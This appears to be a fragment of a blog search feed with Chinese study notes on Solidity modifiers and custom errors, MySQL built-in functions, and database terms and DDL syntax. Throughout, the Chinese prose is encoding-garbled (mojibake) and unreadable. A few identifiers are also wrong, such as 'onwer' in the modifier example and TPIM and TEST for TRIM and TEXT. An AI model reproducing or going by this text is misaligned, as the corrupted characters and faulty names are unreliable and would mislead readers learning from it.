·åˆçº¦ä¸­çš„uintç±»å‹çš„å˜é‡å°±å¯ä»¥ä½¿ç”¨Mathåº“ä¸­çš„å‡½æ•°ï¼Œuintç±»å‹.å‡½æ•°åï¼Œï¼ˆæ³¨æ„çš„å…ˆä½¿ç”¨importå¯¼å…¥åº“ï¼‰<br>11ï¼Œæ³¨æ„åˆçº¦çš„solidityçš„ç‰ˆæœ¬ï¼Œåœ¨0.6ç‰ˆæœ¬æ—¶ï¼Œæ²¡æœ‰å¯¹æº¢å‡ºçš„ä¸€ä¸ªæ£€æŸ¥ï¼Œä½†æ˜¯ä½¿ç”¨SafeMath.solå¯ä»¥å¯¹å®ƒè¿›è¡Œæ£€æŸ¥ã€‚åœ¨solidityç‰ˆæœ¬0.8ä»¥ä¸Šæ—¶ï¼Œå®ƒæœ‰æ£€æŸ¥ä¸Šæº¢å’Œä¸‹æº¢çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å°±ä¸éœ€è¦ä½¿ç”¨SafeMath.sol<br>12,é‡ç½®é˜µåˆ—ï¼šä½¿ç”¨newå…³é”®å­—ï¼Œå³å°†æ¯ä¸ªå…ƒç´ éƒ½é‡ç½®ä¸ºé›¶ï¼Œä¾‹å¦‚ï¼šfouder &#x3D; new address<a href=""></a>;è¿˜æœ‰ä¸€ç§delete.ç›´æ¥åˆ é™¤å˜é‡çš„å€¼<br>13ï¼Œmodifier:ä¿®é¥°å™¨ï¼Œå¦‚æœåˆçº¦è¾ƒé•¿ï¼Œè€Œæˆ‘ä»¬åˆå¿…é¡»æ¯ä¸ªæ£€æŸ¥åˆçº¦çš„æ‰€æœ‰è€…ï¼Œä½¿ç”¨requireçš„è¯ä¼šå¾ˆç¹æ‚ï¼Œæ‰€ä»¥å°±æœ‰ä¿®é¥°å™¨äº†ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == onwer,&quot;Sender is not owner&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæœ‰ä¸ª_,å¦‚æœå‡½æ•°ä½¿ç”¨äº†onlyOwnerçš„ä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆæ‰§è¡Œ_ä»¥å‰çš„ä»£ç ï¼Œå¦‚æœæˆåŠŸï¼Œå†æ‰§è¡Œå‡½æ•°ä¸­çš„ä»£ç <br>14ï¼Œè‡ªå®šä¹‰é”™è¯¯ï¼šä»solidityçš„0.8.4å¼€å§‹ï¼Œå¼•å…¥äº†è‡ªå®šä¹‰çš„é”™è¯¯ï¼Œç”¨äºèŠ‚çœGaså¹¶æé«˜æ›´åŠ å…·ä½“çš„é”™è¯¯ä¿¡æ¯ï¼Œrevertç”¨äºæ‰‹åŠ¨è§¦å‘å¼‚å¸¸ï¼Œä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw (uint amount )&#123;</span><br><span class="line">  if(amount&gt;balance)&#123;</span><br><span class="line">    revert (&quot;Insufficient Balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè‡ªå®šä¹‰é”™è¯¯ï¼Œç”¨äºæä¾›æ›´è¯¦ç»†å’ŒèŠ‚çœGasçš„é”™è¯¯ä¿¡æ¯ï¼Œä¾‹å¦‚:error InsufficientBalance(uint requested,uint available);ä½¿ç”¨çš„æ—¶å€™ç”¨revertå³å¯ï¼šrevert InsufficientBalance(requested:amount,available:balance);<br>15ï¼Œreceive(): é€‚ç”¨äºåˆçº¦ä¸­æœ‰å®ƒï¼Œä¸”æ²¡æœ‰msg.dataçš„å­˜åœ¨ï¼Œè€Œfallback()å°±æ˜¯ç›¸å<br>16ï¼Œä¸€äº›æœ‰ç”¨çš„å°åŠ©æ‰‹<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>è°·æ­Œå¼€å‘çš„ä¸€ä¸ªæ™ºèƒ½è½¯ä»¶ï¼š<a href="https://gemini.google.com/app">Gemini</a>ï¼›<br>ä¸€ä¸ªç¤¾åŒºçš„æ£€ç´¢é—®é¢˜ï¼š<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>ä¸€ä¸ªç¤¾åŒºçš„å…¨çƒäº¤æµå¹³å°ï¼š<a href="https://stackoverflow.com/">stackoverflow</a>;<br>webä¸€ä¸ªçŸ¥è¯†æ„å»ºå¹³å°ï¼š<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;æ•°æ®åº“åŸç†åŠåº”ç”¨è¿›é˜¶&#39;</title>
      <link href="/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a>è¿›é˜¶</h1><h2 id="MySQLå†…ç½®å‡½æ•°"><a href="#MySQLå†…ç½®å‡½æ•°" class="headerlink" title="MySQLå†…ç½®å‡½æ•°"></a>MySQLå†…ç½®å‡½æ•°</h2><p>ä¸€ï¼Œå«ä¹‰ï¼šæ˜¯æŒ‡ä¸€æ®µå¯ä»¥ç›´æ¥è¢«å¦ä¸€æ®µç¨‹åºè°ƒç”¨çš„ç¨‹åºæˆ–ä»£ç </p><p>äºŒï¼Œåˆ†ç±»ï¼š</p><ul><li><p>å­—ç¬¦ä¸²å‡½æ•° ï¼ˆä½¿ç”¨æ—¶ï¼Œå‰é¢åŠ selectï¼‰eg,select concatï¼ˆâ€™heâ€™,â€™DEâ€™ï¼‰</p><ul><li>CONCATï¼ˆS1,S2,S3ï¼‰ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°†S1,S2,S3æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</li><li>LOWERï¼ˆstrï¼‰ï¼šå°†å­—ç¬¦ä¸²strå…¨éƒ¨è½¬åŒ–ä¸ºå°å†™</li><li>UPPER(str) : å°†å­—ç¬¦ä¸²strå…¨éƒ¨è½¬åŒ–ä¸ºå¤§å†™</li><li>LPADï¼ˆstr,n,padï¼‰:å·¦å¡«å……ï¼Œç”¨å­—ç¬¦ä¸²padå¯¹strçš„å·¦è¾¹è¿›è¡Œå¡«å……ï¼Œè¾¾åˆ°nä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦</li><li>RPAD (str,n,pad) :å³å¡«å……ï¼Œç”¨å­—ç¬¦ä¸²padå¯¹strçš„å³è¾¹è¿›è¡Œå¡«å……ï¼Œè¾¾åˆ°nä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦</li><li>TPIMï¼ˆstrï¼‰ï¼šå»æ‰å­—ç¬¦ä¸²å¤´éƒ¨å’Œå°¾éƒ¨çš„ç©ºæ ¼</li><li>SUBSTRING(str,start,len):è¿”å›ä»å­—ç¬¦ä¸²strä»startä½ç½®èµ·çš„lenä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²</li><li>ä¾‹å¦‚ï¼Œå¦‚æœè¦å•ä¸ªå·¥å·å‰é¢æ·»åŠ 0000ï¼Œå°±ä½¿ç”¨update è¡¨å set workno &#x3D; lpad(workno,5,â€™0â€™)</li></ul></li><li><p>æ•°å€¼å‡½æ•°</p><ul><li>CEIL(x):å‘ä¸Šå–æ•´</li><li>FLOORï¼ˆxï¼‰:å‘ä¸‹å–æ•´</li><li>MOD (x,y): è¿”å›x&#x2F;yçš„æ¨¡</li><li>RANDï¼ˆï¼‰ï¼šè¿”å›0-1å†…çš„éšæœºæ•°</li><li>ROUNDï¼ˆx,yï¼‰ï¼šæ±‚xå››èˆäº”å…¥çš„å€¼ï¼Œæš´éœ²yä½å°æ•°   </li><li>ä¾‹å¦‚éšæœºç”Ÿæˆä¸€ä¸ª6ä½æ•°çš„éªŒè¯ç ï¼Œselect lpadï¼ˆround(rand()<em>1000000,0)ï¼Œ6ï¼Œâ€™0â€™ï¼‰,é¦–å…ˆè¿›è¡Œç”Ÿæˆ0-1çš„éšæœºæ•°ï¼Œç„¶åä¹˜ä»¥1000000å°±å˜æˆäº†ä¸€ä¸ªå…­ä½æ•°å¸¦æœ‰å°æ•°çš„æ•°ï¼Œåœ¨ç”¨roundï¼ˆï¼‰å››èˆäº”å…¥æ¶ˆé™¤å°æ•°ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯0.012345</em>1000000å°±ä¼šåªæœ‰5ä½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå¡«å……ï¼Œä½¿ç”¨lpadæˆ–è€…rpadéƒ½å¯ä»¥</li></ul></li><li><p>æ—¥æœŸå‡½æ•°</p><ul><li>CURDATE()ï¼šè¿”å›å½“å‰æ—¥æœŸ</li><li>CURTIME(): è¿”å›å½“å‰æ—¶é—´</li><li>NOW(): è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´</li><li>YEAR(date)ï¼šè·å–æŒ‡å®šdateçš„å¹´ä»½</li><li>MONTH(date): è·å–æŒ‡å®šdateçš„æœˆä»½</li><li>DAYï¼ˆdateï¼‰ï¼šè·å–æŒ‡å®šdateçš„æ—¥æœŸ</li><li>DATE_ADD(date,INTERVAL expr type):è¿”å›ä¸€ä¸ªæ—¥æœŸ&#x2F;æ—¶é—´å€¼åŠ ä¸Šä¸€ä¸ªæ—¶é—´é—´éš”expråçš„æ—¶é—´å€¼</li><li>DATEDIFF(date1,date2):è¿”å›èµ·å§‹æ—¶é—´date1,å’Œç»“æŸæ—¶é—´date2ä¹‹é—´çš„å¤©æ•°</li><li>ä¾‹å¦‚ï¼Œä»å½“å‰æ—¥æœŸå¾€åæ¨70å¤©ï¼Œselect date_add(now(),INTERVAL 70 DAY);æŸ¥è¯¢å‘˜å·¥å…¥èŒçš„å¤©æ•°å¹¶é™åºæ’åºï¼Œselect name datediff(curdate(),entrydate) as â€˜entrydaysâ€™ from è¡¨ order by entrydays desc;ä½¿ç”¨datediffå‡½æ•°ï¼Œä¸ºäº†æ–¹ä¾¿æ’åºï¼Œç”¨as ç»™è®¡ç®—çš„å¤©æ•°èµ·ä¸ªåˆ«åï¼Œæ–¹ä¾¿order by ä½¿ç”¨</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“åŸç†åŠåº”ç”¨åŸºç¡€</title>
      <link href="/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><p>1ï¼Œæ•°æ®æ˜¯æ•°æ®åº“å‚¨å­˜çš„åŸºæœ¬å¯¹è±¡ï¼Œè€Œæ•°æ®åº“åˆ™æ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºä¸­ï¼Œæœ‰ç»„ç»‡ï¼Œå¯å…±äº«çš„å¤§é‡æ•°æ®çš„é›†åˆ<br>   åŸºæœ¬ç‰¹ç‚¹ï¼šæ°¸ä¹…å‚¨å­˜ï¼Œæœ‰ç»„ç»‡ï¼Œå¯å…±äº«ï¼Œå†—ä½™åº¦å°ï¼Œæ˜“æ‰©å±•<br>2ï¼Œä¸€äº›åŸºæœ¬æ¨¡å‹æœ¯è¯­ï¼š</p><ul><li>å…³ç³»ï¼ˆrï¼‰ï¼šå°±æ˜¯ä¸€ä¸ªæ•´ä½“çš„è¡¨ï¼Œå¯å¯¹å…³ç³»çš„æè¿°:å…³ç³»å (å±æ€§1ï¼Œå±æ€§2â€¦..)ï¼›å…³ç³»åå°±æ˜¯è¡¨åï¼›<ul><li>å…³ç³»å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼šå®ä½“ï¼Œå‚ç…§ï¼Œç”¨æˆ·å®šä¹‰å®Œæ•´æ€§</li></ul></li><li>å±æ€§ï¼šè¡¨ä¸­çš„ä¸€åˆ—ä¸ºä¸€ä¸ªå±æ€§</li><li>åŸŸï¼šå±æ€§çš„å–å€¼èŒƒå›´ï¼Œä¸€ä¸ªå…·æœ‰ç›¸åŒç±»å‹çš„å€¼é›†åˆ</li><li>å…ƒç»„ï¼ˆtï¼‰ï¼šè¡¨ä¸­çš„ä¸€è¡Œ</li><li>ä¸»ç ï¼šä¹Ÿå«ç é”®ï¼Œè¡¨ä¸­çš„æŸä¸ªå±æ€§ç»„ï¼Œå®ƒå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå…ƒç»„ï¼Œå°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šå¯ä»¥ç”¨å®ƒæ¥ç¡®å®šå”¯ä¸€çš„å€¼ï¼Œæœ‰ç‚¹ç±»ä¼¼äºcä¸­çš„æŒ‡é’ˆï¼›</li><li>åˆ†é‡ï¼šå…ƒç»„ä¸­çš„ä¸€ä¸ªå±æ€§å€¼</li><li>å…³ç³»æ¨¡å¼ï¼šå¯¹å…³ç³»çš„æè¿°ï¼Œä¹Ÿå«è”ç³»<br>3ï¼Œæ•°æ®åº“ç³»ç»Ÿé‡Œæœ‰ä¸‰ç§æ¨¡å¼ï¼š<br>a,æ¨¡å¼ï¼ˆé€»è¾‘æ¨¡å¼ï¼Œæ¦‚å¿µæ¨¡å¼ï¼‰ï¼šæ•°æ®åº“ä¸­çš„å…¨ä½“æ•°æ®é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œä¸ç‰©ç†å‚¨å­˜çš„ç»†èŠ‚å’Œç¡¬ä»¶ç¯å¢ƒï¼Œä¸å…·ä½“çš„åº”ç”¨ç¨‹åºï¼Œå¼€å‘ç¯å¢ƒåŠé«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€æ— å…³ï¼Œå®ƒæ˜¯æ•°æ®åº“ç³»ç»Ÿæ¨¡å¼çš„ä¸­é—´å±‚<br>bï¼Œå¤–æ¨¡å¼ï¼ˆå­æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼ï¼‰ï¼šæ•°æ®åº“ç”¨æˆ·ä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œæ˜¯ä¸æŸä¸€åº”ç”¨æœ‰å…³çš„æ•°æ®çš„é€»è¾‘è¡¨ç¤ºï¼Œ<strong>æ¯ä¸ªç”¨æˆ·</strong>åªèƒ½çœ‹è§å’Œè®¿é—®å¯¹åº”çš„å¤–æ¨¡å¼ä¸­çš„æ•°æ®ï¼Œç”¨æˆ·åªèƒ½ä¸å¤–æ¨¡å¼å»ºç«‹è”ç³»<br>cï¼Œå†…æ¨¡å¼ï¼ˆå‚¨å­˜æ¨¡å¼ï¼Œç‰©ç†æ¨¡å¼ï¼‰ï¼šæ˜¯æ•°æ®ç‰©ç†ç»“æ„å’Œå‚¨å­˜æ–¹å¼çš„æè¿°ï¼Œæ˜¯æ•°æ®åœ¨æ•°æ®åº“å†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼ï¼šè®°å½•çš„å‚¨å­˜æ–¹å¼ï¼Œç´¢å¼•çš„ç»„ç»‡æ–¹å¼ï¼Œæ•°æ®æ˜¯å¦å‹ç¼©å‚¨å­˜ï¼Œæ•°æ®æ˜¯å¦åŠ å¯†ï¼Œæ•°æ®å‚¨å­˜è®°å½•è®°å½•ç»“æ„çš„è§„å®š<blockquote><p>ç”¨æˆ·-å¤–æ¨¡å¼-æ¨¡å¼-å†…æ¨¡å¼</p></blockquote></li></ul><p>4ï¼ŒäºŒçº§æ˜ åƒï¼Œä¸‰çº§æ¨¡å¼<br>4ï¼Œ<strong>E-Rå›¾</strong>ï¼šå®ä½“ç”¨æ–¹æ¡†ï¼Œå±æ€§ç”¨æ¤­åœ†ï¼Œå…³ç³»ç”¨è±å½¢</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="åŸºæœ¬å«ä¹‰ï¼š"><a href="#åŸºæœ¬å«ä¹‰ï¼š" class="headerlink" title="åŸºæœ¬å«ä¹‰ï¼š"></a>åŸºæœ¬å«ä¹‰ï¼š</h3><p>æ•°æ®æ¨¡å‹ç»„æˆçš„ä¸‰è¦ç´ ï¼šæ•°æ®ç»“æ„ï¼Œæ•°æ®æ“ä½œï¼Œæ•°æ®çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶<br>æ•°æ®åº“(DB)ï¼šå‚¨å­˜æ•°æ®çš„ä»“åº“<br>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰<br>æ•°æ®åº“ç³»ç»Ÿï¼ˆDBSï¼‰ï¼šåŒ…å«äº†æ•°æ®åº“å’Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿ<br>å‹ï¼šå¯¹æŸä¸€ç±»æ•°æ®çš„ç»“æ„å’Œå±æ€§çš„è¯´æ˜ï¼Œå€¼ï¼šå¯¹å‹çš„ä¸€ä¸ªå…·ä½“èµ‹å€¼<br>ç¬›å¡å°”ç§¯ï¼šåŸŸçš„ç›¸ä¹˜ï¼Œå°±æ˜¯åŸŸä¹‹é—´çš„æ’åˆ—ç»„åˆ<br>åŸºæ•°ï¼šä¸€ä¸ªåŸŸå…è®¸çš„ä¸åŒå–å€¼çš„ä¸ªæ•°ã€‚å¦‚åŸŸd1,çš„åŸºæ•°ä¸º2ï¼ŒåŸŸd2çš„åŸºæ•°ä¸º3ï¼Œåˆ™æ€»åŸºæ•°ä¸º2*3&#x3D;6ï¼›<br>MySQL: æ“çºµä½•ç®¡ç†æ•°æ®åº“çš„è½¯ä»¶ï¼Œä¸‹è½½å®‰è£…åï¼Œåœ¨ç»ˆç«¯æ‰“å¼€ï¼Œç”¨ï¼šnet start mysql80,åœæ­¢ç”¨ï¼šnet stop mysql80<br>MySQLæ•°æ®åº“æ¨¡å‹ï¼š<br>1ï¼Œå…³ç³»å‹æ•°æ®åº“ï¼ˆRDBMSï¼‰ï¼šå»ºç«‹åœ¨å…³ç³»å‹æ¨¡å‹åŸºç¡€ä¸Šï¼Œç”±å¤šå¼ ç›¸äº’è¿æ¥çš„äºŒç»´è¡¨ç»„æˆçš„æ•°æ®åº“<br> <a href="http://www.mysql.com/">ä¸‹è½½å®‰è£…MySQL</a><br> 1,ç™»å½•æ•°æ®åº“å‘½ä»¤ï¼šcd  C:\Program Files\MySQL\MySQL Server 8.0\binï¼ˆç”±äºæˆ‘é…ç½®äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€è¿™æ­¥å¯ä»¥çœç•¥ï¼‰<br> 2, å®¢æˆ·ç«¯è¿æ¥ï¼Œè¾“å…¥mysql -h localhost -u root -p,è¿›å…¥æ•°æ®åº“,ä¹Ÿå¯ä»¥ç›´æ¥åœ¨å¼€å§‹ç›´æ¥æ‰“å¼€MySQLçš„å‘½ä»¤æç¤ºæ¿è¾“å…¥å¯†ç å³å¯<br> 3,è¾“å…¥show databases; æŸ¥çœ‹å½“å‰æ•°æ®åº“åˆ—è¡¨<br> 4,é€€å‡ºæ‰§è¡Œå‘½ä»¤ï¼šexitæˆ–è€…quit</p><blockquote><p>ä¸€äº›ä¸“ä¸šçš„åè¯è§£é‡Šï¼š1ï¼Œç´¢å¼•ï¼šåŠ å¿«æŸ¥è¯¢é€Ÿåº¦çš„æœ‰æ•ˆæ–¹å¼ï¼Œç”¨æˆ·å¯ä»¥åœ¨åŸºæœ¬è¡¨ä¸Šå»ºç«‹ä¸€ä¸ªæˆ–è€…å¤šä¸ªç´¢å¼•ï¼Œä»¥æä¾›å­˜å–è·¯å¾„ï¼Œç´¢å¼•æ˜¯å±äºå†…æ¨¡å¼çš„èŒƒç•´ã€‚å”¯ä¸€çš„ç´¢å¼•ï¼šä½¿ç”¨UNIQUEå…³é”®å­—ï¼Œæ¯ä¸ªç´¢å¼•å€¼å¯¹åº”å”¯ä¸€ä¸€æ¡æ•°æ®è®°å½• 2ï¼Œè§†å›¾ï¼šè§†å›¾æ˜¯ä»ä¸€ä¸ªæˆ–è€…å‡ ä¸ªåŸºæœ¬è¡¨å¯¼å‡ºçš„è¡¨ï¼Œæ•°æ®åº“åªå­˜åœ¨è§†å›¾çš„å®šä¹‰è€Œä¸æ˜¯å­˜æ”¾è§†å›¾å¯¹åº”çš„æ•°æ®ï¼ŒåŸºæœ¬è¡¨ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œä»è§†å›¾æŸ¥è¯¢å‡ºçš„æ•°æ®ä¹Ÿä¼šéšä¹‹å˜åŒ–ã€‚</p></blockquote><h3 id="SQLï¼š"><a href="#SQLï¼š" class="headerlink" title="SQLï¼š"></a>SQLï¼š</h3><p>SQLï¼šæ˜¯ç”¨äºç®¡ç†æ•°æ®åº“çš„æ ‡å‡†åŒ–ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒç”¨äºæŸ¥è¯¢ï¼Œæ›´æ–°ï¼Œæ’å…¥å’Œåˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæ“ä½œæ•°æ®åº“çš„è¯­è¨€ï¼Œä¸ç®¡ä»€ä¹ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰ï¼ŒSQLéƒ½å®ç”¨<br>ä»¥ä¸‹æ‰€å†™éƒ½æ˜¯ç”¨çš„å…³ç³»æ¨¡å‹ï¼›</p><h4 id="ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š"><a href="#ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š" class="headerlink" title="ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š"></a>ä¸€ï¼ŒSQLçš„é€šç”¨è¯­æ³•ï¼š</h4><p>aï¼Œå¯å•è¡Œæˆ–å¤šè¡Œä¹¦å†™ï¼Œä¸€åˆ†å·ç»“å°¾<br>b,å¯ä»¥ä½¿ç”¨ç©ºæ ¼æˆ–è€…ç¼©è¿›æ¥å¢å¼ºè¯­å¥çš„å¯è¯»æ€§<br>c,MySQLæ•°æ®åº“çš„SQLè¯­å¥éƒ¨åŒºåˆ†å¤§å°å†™ï¼Œå…³é”®å­—å»ºè®®å¤§å†™<br>d,æ³¨é‡Šï¼š</p><ul><li>å•è¡Œæ³¨é‡Šï¼šâ€“ æ³¨é‡Šå†…å®¹æˆ– #æ³¨é‡Šå†…å®¹ï¼ˆMySQLç‰¹æœ‰ï¼‰</li><li>å¤šè¡Œæ³¨é‡Šï¼š&#x2F;* æ³¨é‡Šå†…å®¹*&#x2F;</li></ul><h4 id="äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š"><a href="#äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š" class="headerlink" title="äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š"></a>äºŒï¼ŒSQLçš„åˆ†ç±»ï¼š</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1ï¼ŒDDLï¼šæ•°æ®å®šä¹‰è¯­è¨€ï¼Œç”¨æ¥å®šä¹‰æ•°æ®åº“å¯¹è±¡ï¼ˆæ•°æ®åº“ï¼Œè¡¨ï¼Œå­—æ®µï¼‰</p><p>a,DDL-æ•°æ®åº“æ“ä½œï¼š</p><ul><li>æŸ¥è¯¢ï¼š<ul><li>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼šSHOW DATABASESï¼›</li><li>æŸ¥è¯¢å½“å‰æ•°æ®åº“ï¼šSELECT DATABASE();</li></ul></li><li>åˆ›å»ºï¼š<ul><li>CREATE DATABASE[IF NOT EXISTS]æ•°æ®åº“å[DEFAULT CHARSET å­—ç¬¦é›†] [COLLATE æ’åºè§„åˆ™]ï¼›<blockquote><p>æ‹¬å·ä»£è¡¨å¯ä»¥æœ‰çš„ï¼Œeg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºCREATE DATABASE itcast;</p></blockquote></li></ul></li><li>åˆ é™¤ï¼š<ul><li>DROP DATABASE[IF EXISTS]æ•°æ®åº“åï¼›</li></ul></li><li>ä½¿ç”¨ï¼š<ul><li>USE æ•°æ®åº“åï¼›é¡¾åæ€ä¹‰åˆ‡æ¢åˆ°ä¸€ä¸ªæ•°æ®åº“ä¸­</li></ul></li></ul><p>b,DDL-è¡¨æ“ä½œ</p><ul><li>æŸ¥è¯¢<ul><li>æŸ¥è¯¢å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨ï¼šSHOW TABLES;</li><li>æŸ¥è¯¢è¡¨çš„ç»“æ„ï¼šDESC è¡¨åï¼›</li><li>æŸ¥è¯¢æŒ‡å®šè¡¨çš„å»ºè¡¨è¯­å¥ SHOW CREATE TABLE è¡¨åï¼›</li></ul></li><li>åˆ›å»º<ul><li>CREATE TABLE è¡¨åï¼ˆ<br> å­—æ®µ1 å­—æ®µç±»å‹ COMMENT å­—æ®µ1æ³¨é‡Šï¼Œ<br> å­—æ®µ1 å­—æ®µç±»å‹ COMMENT å­—æ®µ1æ³¨é‡Šï¼Œ<br> å­—æ®µn å­—æ®µç±»å‹ COMMENT å­—æ®µnæ³¨é‡Š<br>ï¼‰[COMMENT è¡¨æ³¨é‡Š] ï¼›<br>ï¼ˆæ³¨æ„ï¼šæœ€åä¸€ä¸ªå­—æ®µæ²¡æœ‰é€—å·ï¼Œå­—æ®µçš„æ³¨é‡Šå¿…é¡»ç”¨â€™â€™å›´ä½,å¯ä»¥å…ˆåœ¨è®°äº‹æœ¬ä¸Šå†™ï¼Œç„¶åç›´æ¥å¤åˆ¶ï¼‰<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT â€˜ç¼–å·â€™<br>-&gt; ) COMMENT â€˜ç”¨æˆ·è¡¨â€™;</li></ul></li></ul><p>c,DDL-è¡¨æ“ä½œ-æ•°æ®ç±»å‹</p><ul><li>æ•°å€¼ç±»å‹ï¼ˆå‚ç…§Javaï¼‰<ul><li>TINYINT(1byte)ï¼ŒSMALLINT(2bytes),MEDIUMINT(3bytes)ï¼ŒINT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>æœ‰ç¬¦å·ï¼ˆSIGNEDï¼‰ï¼ŒèŒƒå›´æœ‰è´Ÿæ•°ï¼Œæ— ç¬¦å·ï¼ˆUNSIGNEDï¼‰ï¼ŒèŒƒå›´æ— è´Ÿæ•°ï¼Œeg:TINYINT æœ‰ç¬¦å·ï¼š-128<del>127ï¼Œæ— ç¬¦å·ï¼š0</del>255ï¼›</li><li>ä¸¾ä¾‹ï¼šå¹´é¾„ï¼šage TINYINT UNSIGNEDï¼›åˆ†æ•°ï¼šscore DOUBLE(4,1)ï¼Œ4ä¸ºæ ‡åº¦ï¼Œæ€»å…±çš„æ•°å­—ä¸ªæ•°ï¼Œ1ä¸ºç²¾åº¦ï¼Œå°æ•°çš„ä½æ•°</li></ul></li><li>å­—ç¬¦ä¸²ç±»å‹<ul><li>CHAR ï¼šå®šé•¿å­—ç¬¦ä¸²ï¼›VARCHARï¼šå˜é•¿å­—ç¬¦ä¸²ï¼›TEST:é•¿æ–‡æœ¬æ•°æ®ï¼›</li><li>CHAR(10),æ€§èƒ½å¥½ï¼›VARCHAR(10)</li></ul></li><li>æ—¥æœŸæ—¶é—´ç±»å‹<ul><li>DATE:èŒƒå›´ï¼š1000-01-01è‡³9999-12-31ï¼Œæ ¼å¼ï¼šYYYY-MM-DD  æ—¥æœŸå€¼  eg:brithday DATE</li><li>TIME:èŒƒå›´ï¼š-838ï¼š59ï¼š59è‡³838ï¼š59ï¼š59ï¼Œæ ¼å¼ï¼šHH:MM:SS  æ—¶é—´å€¼</li><li>YEAR:èŒƒå›´ï¼š1901è‡³2155   æ ¼å¼ï¼šYYYY å¹´ä»½å€¼</li><li>DATETIME:æ··åˆæ—¥æœŸå’Œæ—¶é—´ æ ¼å¼ï¼šYYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :æ··åˆæ—¥æœŸå’Œæ—¶é—´ï¼Œæ—¶é—´æˆ³ æ ¼å¼ï¼šYYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-è¡¨æ“ä½œ-ä¿®æ”¹</p><ul><li>æ·»åŠ å­—æ®µï¼šALTER TABLE è¡¨å ADD å­—æ®µå ç±»å‹ï¼ˆé•¿åº¦ï¼‰[COMMENT æ³¨é‡Š] [çº¦æŸ ]ï¼›</li><li>ä¿®æ”¹å­—æ®µ<ul><li>ä¿®æ”¹æ•°æ®ç±»å‹ ï¼š ALTER TBALE è¡¨å å­—æ®µå æ–°æ•°æ®ç±»å‹ï¼ˆé•¿åº¦ï¼‰ï¼›</li><li>ä¿®æ”¹å­—æ®µåï¼Œå­—æ®µç±»å‹ ï¼šALTER TABLE è¡¨å CHANGE æ—§å­—æ®µå æ–°å­—æ®µå 